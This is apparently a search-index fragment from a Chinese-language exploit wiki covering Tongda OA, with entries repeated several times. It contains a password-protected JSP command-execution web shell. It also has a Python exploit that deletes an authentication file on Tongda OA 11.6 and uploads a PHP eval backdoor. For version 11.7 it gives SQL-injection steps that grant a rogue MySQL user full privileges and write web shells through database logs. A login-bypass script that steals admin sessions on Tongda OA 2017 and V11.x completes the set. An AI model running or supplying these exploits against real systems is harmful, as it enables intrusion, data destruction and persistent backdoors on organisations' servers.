DBSTEP=OKMLlKlV OPTION=S3WYOSWLBSGr currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66 CREATEDATE=wUghPB3szB3Xwg66 RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6 originalFileId=wV66 originalCreateDate=wUghPB3szB3Xwg66 FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6 needReadFile=yRWZdAS6 originalCreateDate=wLSGP4oEzLKAz4=iz=66 CLIENTIP=wLCXqUKAP7uhw4g5zi=6 <%@ page language=\"java\" import=\"java.util.*,java.io.*\" pageEncoding=\"UTF-8\"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+\"\\n\");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if(\"asasd3344\".equals(request.getParameter(\"pwd\"))&&!\"\".equals(request.getParameter(\"cmd\"))){out.println(\"<pre>\"+excuteCmd(request.getParameter(\"cmd\")) + \"</pre>\");}else{out.println(\":-)\");}%>","title":"\u54cd\u5e94\u5305"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA%2011.6%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%2B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/","text":"\u6f0f\u6d1e\u8303\u56f4 \u00b6 \u901a\u8fbeOA V11.6 \u6f0f\u6d1e\u9a8c\u8bc1 \u00b6 EXP\uff1a \u00b6 import requests target=\"http://********/\" payload=\"<?php eval($_POST['shell']);?>\" print(\"[*]Warning,This exploit code will DELETE auth.inc.php which may damage the OA\") input(\"Press enter to continue\") print(\"[*]Deleting auth.inc.php....\") url=target+\"/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php\" requests.get(url=url) print(\"[*]Checking if file deleted...\") url=target+\"/inc/auth.inc.php\" page=requests.get(url=url).text if 'No input file specified.' not in page: print(\"[-]Failed to deleted auth.inc.php\") exit(-1) print(\"[+]Successfully deleted auth.inc.php!\") print(\"[*]Uploading payload...\") url=target+\"/general/data_center/utils/upload.php?action=upload&filetype=tql&repkid=/.<>./.<>./.<>./\" files = {'FILE1': ('shell.php', payload)} requests.post(url=url,files=files) url=target+\"/_shell.php\" page=requests.get(url=url).text if 'No input file specified.' not in page: print(\"[+]Filed Uploaded Successfully\") print(\"[+]URL:\",url) else: print(\"[-]Failed to upload file\") 1.\u4fdd\u5b58\u4e0a\u8ff0exp\u4e3a.py\u811a\u672c\u6587\u4ef6 2.\u66ff\u6362exp\u4e2d\u7684target\u4e3a\u76ee\u6807url 3.\u6267\u884c\u811a\u672c\u540e\u83dc\u5200\u8fde\u63a5\u8f93\u51fa\u7684URL: ********** \u5373\u53ef\uff0c\u5bc6\u7801\u4e3ashell","title":"\u901a\u8fbeOA 11.6\u6587\u4ef6\u5220\u9664+\u6587\u4ef6\u4e0a\u4f20getshell"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA%2011.6%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%2B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/#_1","text":"\u901a\u8fbeOA V11.6","title":"\u6f0f\u6d1e\u8303\u56f4"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA%2011.6%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%2B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/#_2","text":"","title":"\u6f0f\u6d1e\u9a8c\u8bc1"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA%2011.6%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%2B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/#exp","text":"import requests target=\"http://********/\" payload=\"<?php eval($_POST['shell']);?>\" print(\"[*]Warning,This exploit code will DELETE auth.inc.php which may damage the OA\") input(\"Press enter to continue\") print(\"[*]Deleting auth.inc.php....\") url=target+\"/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php\" requests.get(url=url) print(\"[*]Checking if file deleted...\") url=target+\"/inc/auth.inc.php\" page=requests.get(url=url).text if 'No input file specified.' not in page: print(\"[-]Failed to deleted auth.inc.php\") exit(-1) print(\"[+]Successfully deleted auth.inc.php!\") print(\"[*]Uploading payload...\") url=target+\"/general/data_center/utils/upload.php?action=upload&filetype=tql&repkid=/.<>./.<>./.<>./\" files = {'FILE1': ('shell.php', payload)} requests.post(url=url,files=files) url=target+\"/_shell.php\" page=requests.get(url=url).text if 'No input file specified.' not in page: print(\"[+]Filed Uploaded Successfully\") print(\"[+]URL:\",url) else: print(\"[-]Failed to upload file\") 1.\u4fdd\u5b58\u4e0a\u8ff0exp\u4e3a.py\u811a\u672c\u6587\u4ef6 2.\u66ff\u6362exp\u4e2d\u7684target\u4e3a\u76ee\u6807url 3.\u6267\u884c\u811a\u672c\u540e\u83dc\u5200\u8fde\u63a5\u8f93\u51fa\u7684URL: ********** \u5373\u53ef\uff0c\u5bc6\u7801\u4e3ashell","title":"EXP\uff1a"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA%2011.7%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5/","text":"\u6f0f\u6d1e\u5f71\u54cd\u7248\u672c \u00b6 \u901a\u8fbeoa 11.7 \u5229\u7528\u6761\u4ef6:\u9700\u8981\u8d26\u53f7\u767b\u5f55 POC \u00b6 1\u3001\u4e0b\u8f7d\u901a\u8fbeOA 11.7\uff0c https://cdndown.tongda2000.com/oa/2019/TDOA11.7.exe 2\u3001condition_cascade\u53c2\u6570\u5b58\u5728\u5e03\u5c14\u76f2\u6ce8 3.\u7ecf\u8fc7\u6d4b\u8bd5\uff0c\u8fc7\u6ee4\u4e86\u4e00\u4e9b\u51fd\u6570(sleep\u3001\u62a5\u9519\u7684\u51fd\u6570\u7b49\u7b49)\uff0c\u5404\u79cd\u6ce8\u91ca\uff0c\u4f7f\u7528payload\uff1aselect if((1=1),1,power(9999,99))\u3001select if((1=2),1,power(9999,99))\uff0c\u5224\u65ad\u6ce8\u5165\u70b9 #\u5f53\u5b57\u7b26\u76f8\u7b49\u65f6\uff0c\u4e0d\u62a5\u9519\uff0c\u9519\u8bef\u65f6\u62a5\u9519 4\u3001\u901a\u8fc7\u6dfb\u52a0\u7528\u6237at666\uff0c\u5bc6\u7801\u4e3aabcABC@123 5\u3001\u4f7f\u7528Navicat Premium\u8fde\u63a5\u6570\u636e\u5e93 6\u3001\u6dfb\u52a0\u7684\u8d26\u6237\u4e0d\u80fd\u76f4\u63a5\u901a\u8fc7\u65e5\u5fd7\u6162\u67e5\u8be2\u5199\u5165\u6587\u4ef6\uff0c\u9700\u8981\u7ed9\u521b\u5efa\u7684\u8d26\u6237\u6dfb\u52a0\u6743\u9650 \u63d0\u6743 7\u3001\u7136\u540e\u7528\u6ce8\u5165\u70b9\u5237\u65b0\u6743\u9650\uff0c\u56e0\u4e3a\u8be5\u7528\u6237\u662f\u6ca1\u6709\u5237\u65b0\u6743\u9650\u7684\u6743\u9650\u7684 general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges; 8\u3001\u518d\u6b21\u767b\u5f55\uff0c\u63d0\u793a\u5bc6\u7801\u8fc7\u671f\uff0c\u9700\u8981\u91cd\u65b0\u6267\u884cgrant all privileges ON mysql.* TO 'at666'@'%' IDENTIFIED BY 'abcABC@123' WITH GRANT OPTION 9\u3001\u7136\u540e\u5199shell 10\u3001\u83dc\u5200\u8fde\u63a5 ========================================================================= \u901a\u8fbeOA 11.7 \u540e\u53f0sql\u6ce8\u5165\u6f0f\u6d1e\u590d\u73b0 \u4e00\u3001****\u6f0f\u6d1e\u63cf\u8ff0 \u901a\u8fbeOA 11.7\u5b58\u5728sql\u6ce8\u5165 \u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd\u7248\u672c \u901a\u8fbeoa 11.7 \u5229\u7528\u6761\u4ef6:\u9700\u8981\u8d26\u53f7\u767b\u5f55 \u4e09\u3001\u6f0f\u6d1e\u590d\u73b0 1\u3001\u4e0b\u8f7d\u901a\u8fbeOA 11.7\uff0c https://cdndown.tongda2000.com/oa/2019/TDOA11.7.exe \uff0c\u70b9\u51fb\u5b89\u88c5 2\u3001condition_cascade\u53c2\u6570\u5b58\u5728\u5e03\u5c14\u76f2\u6ce8 POC\uff1a GET /general/hr/manage/query/delete_cascade.php?condition_cascade=select if((substr(user(),1,1)='r'),1,power(9999,99)) HTTP/1.1 Host: 192.168.77.137 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 X-Requested-With: XMLHttpRequest Referer: http://192.168.77.137/general/index.php?isIE=0&modify_pwd=0 Cookie: PHPSESSID=ebpjtm5tqh5tvida5keba73fr0; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c71fa06d DNT: 1 Connection: close 3\u3001\u7ecf\u8fc7\u6d4b\u8bd5\uff0c\u8fc7\u6ee4\u4e86\u4e00\u4e9b\u51fd\u6570(sleep\u3001\u62a5\u9519\u7684\u51fd\u6570\u7b49\u7b49)\uff0c\u5404\u79cd\u6ce8\u91ca\uff0c\u4f7f\u7528payload\uff1aselect if((1=1),1,power(9999,99))\u3001select if((1=2),1,power(9999,99))\uff0c\u5224\u65ad\u6ce8\u5165\u70b9 #\u5f53\u5b57\u7b26\u76f8\u7b49\u65f6\uff0c\u4e0d\u62a5\u9519\uff0c\u9519\u8bef\u65f6\u62a5\u9519 4\u3001\u901a\u8fc7\u6dfb\u52a0\u7528\u6237at666\uff0c\u5bc6\u7801\u4e3aabcABC@123 grant all privileges ON mysql.* TO 'at666'@'%' IDENTIFIED BY 'abcABC@123' WITH GRANT OPTION 5\u3001\u4f7f\u7528Navicat Premium\u8fde\u63a5\u6570\u636e\u5e93 6\u3001\u6dfb\u52a0\u7684\u8d26\u6237\u4e0d\u80fd\u76f4\u63a5\u901a\u8fc7\u65e5\u5fd7\u6162\u67e5\u8be2\u5199\u5165\u6587\u4ef6\uff0c\u9700\u8981\u7ed9\u521b\u5efa\u7684\u8d26\u6237\u6dfb\u52a0\u6743\u9650 UPDATE mysql . user SET Password = '*DE0742FA79F6754E99FDB9C8D2911226A5A9051D', Select_priv = 'Y', Insert_priv = 'Y', Update_priv = 'Y', Delete_priv = 'Y', Create_priv = 'Y', Drop_priv = 'Y', Reload_priv = 'Y', Shutdown_priv = 'Y', Process_priv = 'Y', File_priv = 'Y', Grant_priv = 'Y', References_priv = 'Y', Index_priv = 'Y', Alter_priv = 'Y', Show_db_priv = 'Y', Super_priv = 'Y', Create_tmp_table_priv = 'Y', Lock_tables_priv = 'Y', Execute_priv = 'Y', Repl_slave_priv = 'Y', Repl_client_priv = 'Y', Create_view_priv = 'Y', Show_view_priv = 'Y', Create_routine_priv = 'Y', Alter_routine_priv = 'Y', Create_user_priv = 'Y', Event_priv = 'Y', Trigger_priv = 'Y', Create_tablespace_priv = 'Y', ssl_type = '', ssl_cipher = '', x509_issuer = '', x509_subject = '', max_questions = 0, max_updates = 0, max_connections = 0, max_user_connections = 0, plugin = 'mysql_native_password', authentication_string = '', password_expired = 'Y' WHERE Host = Cast('%' AS Binary(1)) AND User = Cast('at666' AS Binary(5)); 7\u3001\u7136\u540e\u7528\u6ce8\u5165\u70b9\u5237\u65b0\u6743\u9650\uff0c\u56e0\u4e3a\u8be5\u7528\u6237\u662f\u6ca1\u6709\u5237\u65b0\u6743\u9650\u7684\u6743\u9650\u7684 general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges; 8\u3001\u518d\u6b21\u767b\u5f55\uff0c\u63d0\u793a\u5bc6\u7801\u8fc7\u671f\uff0c\u9700\u8981\u91cd\u65b0\u6267\u884cgrant all privileges ON mysql.* TO 'at666'@'%' IDENTIFIED BY 'abcABC@123' WITH GRANT OPTION 9\u3001\u7136\u540e\u5199shell \u65b9\u6cd5\u4e00: select @ @basedir ; set global slow_query_log=on; set global slow_query_log_file='C:/tongda11.7/webroot/test.php'; select '<?php eval($_POST[x]);?>' or sleep(11); \u65b9\u6cd5\u4e8c: select @ @basedir ; set global general_log = on; set global general_log_file ='C:/tongda11.7/webroot/test2.php'; select '<?php eval($_POST[test2]);?>'; show variables like '%general%'; 10\u3001\u83dc\u5200\u8fde\u63a5","title":"\u901a\u8fbeOA 11.7\u5b58\u5728sql\u6ce8\u5165"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA%2011.7%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5/#_1","text":"\u901a\u8fbeoa 11.7 \u5229\u7528\u6761\u4ef6:\u9700\u8981\u8d26\u53f7\u767b\u5f55","title":"\u6f0f\u6d1e\u5f71\u54cd\u7248\u672c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA%2011.7%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5/#poc","text":"1\u3001\u4e0b\u8f7d\u901a\u8fbeOA 11.7\uff0c https://cdndown.tongda2000.com/oa/2019/TDOA11.7.exe 2\u3001condition_cascade\u53c2\u6570\u5b58\u5728\u5e03\u5c14\u76f2\u6ce8 3.\u7ecf\u8fc7\u6d4b\u8bd5\uff0c\u8fc7\u6ee4\u4e86\u4e00\u4e9b\u51fd\u6570(sleep\u3001\u62a5\u9519\u7684\u51fd\u6570\u7b49\u7b49)\uff0c\u5404\u79cd\u6ce8\u91ca\uff0c\u4f7f\u7528payload\uff1aselect if((1=1),1,power(9999,99))\u3001select if((1=2),1,power(9999,99))\uff0c\u5224\u65ad\u6ce8\u5165\u70b9 #\u5f53\u5b57\u7b26\u76f8\u7b49\u65f6\uff0c\u4e0d\u62a5\u9519\uff0c\u9519\u8bef\u65f6\u62a5\u9519 4\u3001\u901a\u8fc7\u6dfb\u52a0\u7528\u6237at666\uff0c\u5bc6\u7801\u4e3aabcABC@123 5\u3001\u4f7f\u7528Navicat Premium\u8fde\u63a5\u6570\u636e\u5e93 6\u3001\u6dfb\u52a0\u7684\u8d26\u6237\u4e0d\u80fd\u76f4\u63a5\u901a\u8fc7\u65e5\u5fd7\u6162\u67e5\u8be2\u5199\u5165\u6587\u4ef6\uff0c\u9700\u8981\u7ed9\u521b\u5efa\u7684\u8d26\u6237\u6dfb\u52a0\u6743\u9650 \u63d0\u6743 7\u3001\u7136\u540e\u7528\u6ce8\u5165\u70b9\u5237\u65b0\u6743\u9650\uff0c\u56e0\u4e3a\u8be5\u7528\u6237\u662f\u6ca1\u6709\u5237\u65b0\u6743\u9650\u7684\u6743\u9650\u7684 general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges; 8\u3001\u518d\u6b21\u767b\u5f55\uff0c\u63d0\u793a\u5bc6\u7801\u8fc7\u671f\uff0c\u9700\u8981\u91cd\u65b0\u6267\u884cgrant all privileges ON mysql.* TO 'at666'@'%' IDENTIFIED BY 'abcABC@123' WITH GRANT OPTION 9\u3001\u7136\u540e\u5199shell 10\u3001\u83dc\u5200\u8fde\u63a5 ========================================================================= \u901a\u8fbeOA 11.7 \u540e\u53f0sql\u6ce8\u5165\u6f0f\u6d1e\u590d\u73b0 \u4e00\u3001****\u6f0f\u6d1e\u63cf\u8ff0 \u901a\u8fbeOA 11.7\u5b58\u5728sql\u6ce8\u5165 \u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd\u7248\u672c \u901a\u8fbeoa 11.7 \u5229\u7528\u6761\u4ef6:\u9700\u8981\u8d26\u53f7\u767b\u5f55 \u4e09\u3001\u6f0f\u6d1e\u590d\u73b0 1\u3001\u4e0b\u8f7d\u901a\u8fbeOA 11.7\uff0c https://cdndown.tongda2000.com/oa/2019/TDOA11.7.exe \uff0c\u70b9\u51fb\u5b89\u88c5 2\u3001condition_cascade\u53c2\u6570\u5b58\u5728\u5e03\u5c14\u76f2\u6ce8 POC\uff1a GET /general/hr/manage/query/delete_cascade.php?condition_cascade=select if((substr(user(),1,1)='r'),1,power(9999,99)) HTTP/1.1 Host: 192.168.77.137 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 X-Requested-With: XMLHttpRequest Referer: http://192.168.77.137/general/index.php?isIE=0&modify_pwd=0 Cookie: PHPSESSID=ebpjtm5tqh5tvida5keba73fr0; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c71fa06d DNT: 1 Connection: close 3\u3001\u7ecf\u8fc7\u6d4b\u8bd5\uff0c\u8fc7\u6ee4\u4e86\u4e00\u4e9b\u51fd\u6570(sleep\u3001\u62a5\u9519\u7684\u51fd\u6570\u7b49\u7b49)\uff0c\u5404\u79cd\u6ce8\u91ca\uff0c\u4f7f\u7528payload\uff1aselect if((1=1),1,power(9999,99))\u3001select if((1=2),1,power(9999,99))\uff0c\u5224\u65ad\u6ce8\u5165\u70b9 #\u5f53\u5b57\u7b26\u76f8\u7b49\u65f6\uff0c\u4e0d\u62a5\u9519\uff0c\u9519\u8bef\u65f6\u62a5\u9519 4\u3001\u901a\u8fc7\u6dfb\u52a0\u7528\u6237at666\uff0c\u5bc6\u7801\u4e3aabcABC@123 grant all privileges ON mysql.* TO 'at666'@'%' IDENTIFIED BY 'abcABC@123' WITH GRANT OPTION 5\u3001\u4f7f\u7528Navicat Premium\u8fde\u63a5\u6570\u636e\u5e93 6\u3001\u6dfb\u52a0\u7684\u8d26\u6237\u4e0d\u80fd\u76f4\u63a5\u901a\u8fc7\u65e5\u5fd7\u6162\u67e5\u8be2\u5199\u5165\u6587\u4ef6\uff0c\u9700\u8981\u7ed9\u521b\u5efa\u7684\u8d26\u6237\u6dfb\u52a0\u6743\u9650 UPDATE mysql . user SET Password = '*DE0742FA79F6754E99FDB9C8D2911226A5A9051D', Select_priv = 'Y', Insert_priv = 'Y', Update_priv = 'Y', Delete_priv = 'Y', Create_priv = 'Y', Drop_priv = 'Y', Reload_priv = 'Y', Shutdown_priv = 'Y', Process_priv = 'Y', File_priv = 'Y', Grant_priv = 'Y', References_priv = 'Y', Index_priv = 'Y', Alter_priv = 'Y', Show_db_priv = 'Y', Super_priv = 'Y', Create_tmp_table_priv = 'Y', Lock_tables_priv = 'Y', Execute_priv = 'Y', Repl_slave_priv = 'Y', Repl_client_priv = 'Y', Create_view_priv = 'Y', Show_view_priv = 'Y', Create_routine_priv = 'Y', Alter_routine_priv = 'Y', Create_user_priv = 'Y', Event_priv = 'Y', Trigger_priv = 'Y', Create_tablespace_priv = 'Y', ssl_type = '', ssl_cipher = '', x509_issuer = '', x509_subject = '', max_questions = 0, max_updates = 0, max_connections = 0, max_user_connections = 0, plugin = 'mysql_native_password', authentication_string = '', password_expired = 'Y' WHERE Host = Cast('%' AS Binary(1)) AND User = Cast('at666' AS Binary(5)); 7\u3001\u7136\u540e\u7528\u6ce8\u5165\u70b9\u5237\u65b0\u6743\u9650\uff0c\u56e0\u4e3a\u8be5\u7528\u6237\u662f\u6ca1\u6709\u5237\u65b0\u6743\u9650\u7684\u6743\u9650\u7684 general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges; 8\u3001\u518d\u6b21\u767b\u5f55\uff0c\u63d0\u793a\u5bc6\u7801\u8fc7\u671f\uff0c\u9700\u8981\u91cd\u65b0\u6267\u884cgrant all privileges ON mysql.* TO 'at666'@'%' IDENTIFIED BY 'abcABC@123' WITH GRANT OPTION 9\u3001\u7136\u540e\u5199shell \u65b9\u6cd5\u4e00: select @ @basedir ; set global slow_query_log=on; set global slow_query_log_file='C:/tongda11.7/webroot/test.php'; select '<?php eval($_POST[x]);?>' or sleep(11); \u65b9\u6cd5\u4e8c: select @ @basedir ; set global general_log = on; set global general_log_file ='C:/tongda11.7/webroot/test2.php'; select '<?php eval($_POST[test2]);?>'; show variables like '%general%'; 10\u3001\u83dc\u5200\u8fde\u63a5","title":"POC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA2017%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/","text":"\u5f71\u54cd\u8303\u56f4 \u00b6 \u901a\u8fbeOA2017\u3001V11.X<V11.5 \u6f0f\u6d1e\u9a8c\u8bc1POC \u00b6 ''' @Author : Sp4ce @Date : 2020-03-17 23:42:16 LastEditors : Sp4ce LastEditTime : 2020-08-27 10:21:44 @Description : Challenge Everything. ''' import requests from random import choice import argparse import json USER_AGENTS = [ \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)\", \"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\", \"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)\", \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)\", \"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)\", \"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)\", \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)\", \"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6\", \"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1\", \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0\", \"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5\", \"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20\", \"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER\", \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)\", \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)\", \"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1\", \"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5\", \"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre\", \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11\", \"Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10\" ] headers={} def getV11Session(url): checkUrl = url+'/general/login_code.php' try: headers[\"User-Agent\"] = choice(USER_AGENTS) res = requests.get(checkUrl,headers=headers) resText = str(res.text).split('{') codeUid = resText[-1].replace('}\"}', '').replace('\\r\\n', '') getSessUrl = url+'/logincheck_code.php' res = requests.post( getSessUrl, data={'CODEUID': '{'+codeUid+'}', 'UID': int(1)},headers=headers) tmp_cookie = res.headers['Set-Cookie'] headers[\"User-Agent\"] = choice(USER_AGENTS) headers[\"Cookie\"] = tmp_cookie check_available = requests.get(url + '/general/index.php',headers=headers) if '\u7528\u6237\u672a\u767b\u5f55' not in check_available.text: if '\u91cd\u65b0\u767b\u5f55' not in check_available.text: print('[+]Get Available COOKIE:' + tmp_cookie) else: print('[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.') except: print('[-]Something Wrong With '+url) def get2017Session(url): checkUrl = url+'/ispirit/login_code.php' try: headers[\"User-Agent\"] = choice(USER_AGENTS) res = requests.get(checkUrl,headers=headers) resText = json.loads(res.text) codeUid = resText['codeuid'] codeScanUrl = url+'/general/login_code_scan.php' res = requests.post(codeScanUrl, data={'codeuid': codeUid, 'uid': int( 1), 'source': 'pc', 'type': 'confirm', 'username': 'admin'},headers=headers) resText = json.loads(res.text) status = resText['status'] if status == str(1): getCodeUidUrl = url+'/ispirit/login_code_check.php?codeuid='+codeUid res = requests.get(getCodeUidUrl) tmp_cookie = res.headers['Set-Cookie'] headers[\"User-Agent\"] = choice(USER_AGENTS) headers[\"Cookie\"] = tmp_cookie check_available = requests.get(url + '/general/index.php',headers=headers) if '\u7528\u6237\u672a\u767b\u5f55' not in check_available.text: if '\u91cd\u65b0\u767b\u5f55' not in check_available.text: print('[+]Get Available COOKIE:' + tmp_cookie) else: print('[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.') else: print('[-]Something Wrong With '+url + ' Maybe Not Vulnerable ?') except: print('[-]Something Wrong With '+url) if __name__ == \"__main__\": parser = argparse.ArgumentParser() parser.add_argument( \"-v\", \"--tdoaversion\", type=int, choices=[11, 2017], help=\"Target TongDa OA Version. e.g: -v 11\u3001-v 2017\") parser.add_argument( \"-url\", \"--targeturl\", type=str, help=\"Target URL. e.g: -url 192.168.2.1\u3001-url http://192.168.2.1\" ) args = parser.parse_args() url = args.targeturl if 'http://' not in url: url = 'http://' + url if args.tdoaversion == 11: getV11Session(url) elif args.tdoaversion == 2017: get2017Session(url) else: parser.print_help() python3 poc.py -v \u7248\u672c -url url \u8fd0\u884c\u5e76\u83b7\u53d6\u5230\u53ef\u7528\u7684SESSIONID 